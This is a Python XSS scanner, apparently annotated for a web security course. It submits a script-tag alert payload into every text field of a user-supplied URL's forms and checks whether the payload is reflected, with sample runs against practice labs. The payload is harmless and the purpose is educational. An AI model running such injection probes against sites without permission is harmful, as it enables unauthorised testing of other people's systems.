
#!/usr/bin/env python3

# Author:      Abdou Rockikz
# Description: TODO: Add description 
# Date:        TODO: 08/30/2023
# Modified by: TODO: David Prutch

### TODO: Install requests bs4 before executing this in Python3

# Import libraries

import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

# Declare functions

### TODO: Add function explanation here ###
# This function retrieves all the HTML forms present on a given web page specified by the 'url'.
# It uses the 'bs' function to parse the HTML content of the page and then finds and returns all the form elements.
def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

### TODO: Add function explanation here ###
# This function extracts detailed information about a specific HTML form, provided as 'form' parameter.
# It captures attributes like 'action', 'method', and input fields with their respective attributes.
# The collected information is stored in a dictionary named 'details' and returned.
def get_form_details(form):
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

### TODO: Add function explanation here ###
# This function simulates the submission of a form with specified 'form_details', 'url', and 'value' parameters.
# It constructs the target URL using the 'action' attribute of the form, then prepares data for the form submission.
# Depending on the form's 'method', it sends either a POST or GET request to the target URL with the form data.
def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

### TODO: Add function explanation here ###
# This function identifies potential Cross-Site Scripting (XSS) vulnerabilities on a given 'url'.
# It begins by collecting all forms on the specified page and then attempts to inject a JavaScript payload
# into each form's input fields. The payload is designed to trigger an alert prompt with specific text.
# If the injected payload is present in the response content after submitting the form, an XSS vulnerability
# is detected, and the function prints relevant details about the form.
def scan_xss(url):
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    js_script = '''
    <script>
        // Malicious code: Display an alert with text when the page is loaded
        alert("XSS Vulnerability Detected: This website is insecure.");
    </script>
    '''
    is_vulnerable = False
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable = True
    return is_vulnerable

# Main

### TODO: Add main explanation here ###
# This main function serves as the entry point to the script. It prompts the user to input a URL to be tested for
# Cross-Site Scripting (XSS) vulnerabilities. Once the URL is provided, the 'scan_xss' function is called to perform
# the vulnerability scanning process on the provided URL. The function's result, indicating the presence of an XSS
# vulnerability, is printed to the console.
if __name__ == "__main__":
    url = input("Enter a URL to test for XSS:") 
    print(scan_xss(url))

### TODO: When you have finished annotating this script with your own comments, copy it to Web Security Dojo
### TODO: Test this script against one XSS-positive target and one XSS-negative target
### TODO: Paste the outputs here as comments in this script, clearly indicating which is positive detection and negative detection
# Positive target
# dojo@dojo-VirtualBox:~$ /usr/bin/python3 /home/dojo/challenge.py
# Enter a URL to test for XSS:https://xss-game.appspot.com/level1/frame
# [+] Detected 1 forms on https://xss-game.appspot.com/level1/frame.
# [+] XSS Detected on https://xss-game.appspot.com/level1/frame
# [*] Form details:
# {'action': '',
#  'inputs': [{'name': 'query',
#              'type': 'text',
#              'value': '\n'
#                       '    <script>\n'
#                       '        // Malicious code: Display an alert with text '
#                       'when the page is loaded\n'
#                       '        alert("XSS Vulnerability Detected: This website '
#                       'is insecure.");\n'
#                       '    </script>\n'
#                       '    '},
#             {'name': None, 'type': 'submit'}],
#  'method': 'get'}
# True

# Negative Target
# dojo@dojo-VirtualBox:~$ /usr/bin/python3 /home/dojo/challenge.py
# Enter a URL to test for XSS:http://dvwa.local/security.php
# [+] Detected 1 forms on http://dvwa.local/security.php.
# False